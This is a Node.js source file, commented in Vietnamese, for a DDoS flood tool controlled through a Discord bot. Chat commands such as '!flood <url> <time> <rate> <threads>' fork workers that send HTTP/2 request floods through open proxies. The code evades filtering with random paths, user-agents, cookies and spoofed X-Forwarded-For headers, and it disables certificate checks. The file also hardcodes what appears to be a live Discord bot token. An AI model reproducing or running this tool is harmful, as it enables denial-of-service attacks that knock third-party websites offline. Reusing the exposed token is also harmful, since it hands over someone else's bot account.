// ==++==
// HTTPV7-SIMPLE.js - Flood Control via Discord (ĐƠN GIẢN NHẤT)
// Chạy: node HTTPV7-SIMPLE.js
// ==++==

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// ==================== THƯ VIỆN ====================
const { Client, GatewayIntentBits } = require('discord.js');
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");

// ==================== CONFIG ====================
const TOKEN = 'MTQ1NjU5ODMxNDI3NDM5NDE2NA.G4Quyv.13gehaq3kmb3hPy8bbuswTLxqSjnhk0DqeJ1qw';  // THAY TOKEN CỦA BẠN VÀO ĐÂY
const CHANNEL_ID = '1456595444477198508'; // THAY CHANNEL ID VÀO ĐÂY

// ==================== KIỂM TRA CONFIG ====================
if (TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.log('\x1b[31m❌ LỖI: Bạn chưa thay token bot!\x1b[0m');
    console.log('\x1b[33m📝 Hướng dẫn:\x1b[0m');
    console.log('1. Vào https://discord.com/developers/applications');
    console.log('2. Tạo bot, copy token');
    console.log('3. Dán token vào file này');
    process.exit(1);
}

// ==================== TẢI PROXY ====================
let proxyList = ['direct'];
try {
    if (fs.existsSync('./proxy.txt')) {
        proxyList = fs.readFileSync('./proxy.txt', 'utf-8')
            .split('\n')
            .filter(line => line.includes(':'));
        console.log(`\x1b[32m[+] Loaded ${proxyList.length} proxies\x1b[0m`);
    }
} catch (e) {}

// ==================== TLS CONFIG ====================
const secureContext = tls.createSecureContext({
    ciphers: "GREASE:ECDHE+AESGCM:ECDHE+CHACHA20",
    honorCipherOrder: true
});

// ==================== RANDOM ====================
function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomString(len) { return crypto.randomBytes(len).toString('hex').slice(0, len); }
function randomIP() { return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`; }

// ==================== USER-AGENTS ====================
const uas = [
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0) Version/20.0 Mobile/15E148 Safari/604.1'
];

// ==================== CLASS NetSocket ====================
class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\n\r\n`;
        const conn = net.connect(options.port, options.host, () => conn.write(payload));
        conn.setTimeout(3000);
        conn.on('data', d => d.toString().includes('200') ? callback(conn) : conn.destroy());
        conn.on('error', () => callback(null));
        conn.on('timeout', () => conn.destroy());
    }
}

// ==================== WORKER FLOOD ====================
function createWorker(target, rate) {
    const parsed = url.parse(target);
    const Socker = new NetSocket();
    let count = 0;
    
    setInterval(() => {
        if (count > 0 && process.send) process.send(count);
        count = 0;
    }, 1000);
    
    function flood() {
        const proxy = randomElement(proxyList);
        if (proxy === 'direct') return setTimeout(flood, 100);
        
        const [ph, pp] = proxy.split(':');
        const headers = {
            ':method': 'GET',
            ':path': parsed.path + '?' + randomString(8),
            ':authority': parsed.host,
            'user-agent': randomElement(uas),
            'accept': '*/*',
            'x-forwarded-for': randomIP(),
            'cookie': randomString(20)
        };

        Socker.HTTP({ host: ph, port: parseInt(pp), address: parsed.host + ':443' }, (conn) => {
            if (!conn) return;
            
            const tlsConn = tls.connect({
                socket: conn,
                servername: parsed.host,
                rejectUnauthorized: false,
                secureContext: secureContext
            });
            
            const client = http2.connect(parsed.href, { createConnection: () => tlsConn });
            
            client.on('connect', () => {
                for (let i = 0; i < rate; i++) {
                    try {
                        client.request(headers).end();
                        count++;
                    } catch (e) {}
                }
                setTimeout(() => client.close(), 100);
            });
        });
        
        setImmediate(flood);
    }
    
    flood();
}

// ==================== DISCORD BOT ====================
const client = new Client({ 
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] 
});

client.once('ready', () => {
    console.log(`\x1b[32m[+] Bot ${client.user.tag} đã sẵn sàng!\x1b[0m`);
    const channel = client.channels.cache.get(CHANNEL_ID);
    if (channel) channel.send('✅ **HTTPV7 READY** - Gõ `!help`');
});

let currentAttack = null;
let workers = [];
let totalReqs = 0;

client.on('messageCreate', async (msg) => {
    if (msg.channel.id !== CHANNEL_ID || !msg.content.startsWith('!')) return;
    
    const args = msg.content.slice(1).split(' ');
    const cmd = args[0].toLowerCase();
    
    if (cmd === 'help') {
        msg.channel.send(`
**📚 LỆNH:**
\`!flood <url> <time> <rate> <threads>\` - VD: \`!flood https://example.com 60 100 5\`
\`!stop\` - Dừng tấn công
\`!status\` - Xem trạng thái
\`!help\` - Hướng dẫn
        `);
    }
    
    else if (cmd === 'flood') {
        if (args.length < 5) return msg.channel.send('❌ Thiếu tham số! VD: !flood https://example.com 60 100 5');
        
        const target = args[1];
        const time = parseInt(args[2]);
        const rate = parseInt(args[3]);
        const threads = parseInt(args[4]);
        
        if (!target.startsWith('http')) return msg.channel.send('❌ URL phải bắt đầu bằng http');
        if (isNaN(time) || time < 10) return msg.channel.send('❌ Thời gian phải >= 10');
        if (isNaN(rate) || rate < 1) return msg.channel.send('❌ Rate phải >= 1');
        if (isNaN(threads) || threads < 1) return msg.channel.send('❌ Threads phải >= 1');
        
        // Dừng attack cũ
        if (currentAttack) {
            workers.forEach(w => w.kill());
            workers = [];
        }
        
        msg.channel.send(`🔥 **BẮT ĐẦU TẤN CÔNG**\nTarget: ${target}\nTime: ${time}s\nRate: ${rate}\nThreads: ${threads}\nProxy: ${proxyList.length}`);
        
        // Fork workers
        if (cluster.isMaster) {
            for (let i = 0; i < threads; i++) {
                const worker = cluster.fork();
                worker.send({ target, rate });
                workers.push(worker);
            }
            
            currentAttack = { target, time, start: Date.now() };
            totalReqs = 0;
            
            cluster.on('message', (w, cnt) => totalReqs += cnt);
            
            setTimeout(() => {
                if (currentAttack) {
                    workers.forEach(w => w.kill());
                    workers = [];
                    currentAttack = null;
                    msg.channel.send(`✅ **KẾT THÚC** - Tổng: ${totalReqs.toLocaleString()} requests`);
                }
            }, time * 1000);
        }
    }
    
    else if (cmd === 'stop') {
        if (currentAttack) {
            workers.forEach(w => w.kill());
            workers = [];
            currentAttack = null;
            msg.channel.send('🛑 **ĐÃ DỪNG**');
        } else {
            msg.channel.send('⚠️ Không có attack nào');
        }
    }
    
    else if (cmd === 'status') {
        if (currentAttack) {
            const elapsed = Math.floor((Date.now() - currentAttack.start) / 1000);
            const rps = Math.floor(totalReqs / (elapsed || 1));
            msg.channel.send(`📊 **STATUS**\nThời gian: ${elapsed}s / ${currentAttack.time}s\nRequests: ${totalReqs.toLocaleString()}\nRPS: ${rps}\nWorkers: ${workers.length}`);
        } else {
            msg.channel.send('📴 Không có attack');
        }
    }
});

// ==================== MAIN ====================
if (cluster.isMaster) {
    client.login(TOKEN).catch(err => {
        console.log('\x1b[31m❌ LỖI LOGIN DISCORD:\x1b[0m', err.message);
        console.log('\x1b[33m📝 Kiểm tra lại:\x1b[0m');
        console.log('1. Token có đúng không?');
        console.log('2. Bot đã được invite vào server?');
        console.log('3. Channel ID có đúng không?');
        process.exit(1);
    });
} else {
    process.on('message', (data) => createWorker(data.target, data.rate));
    }
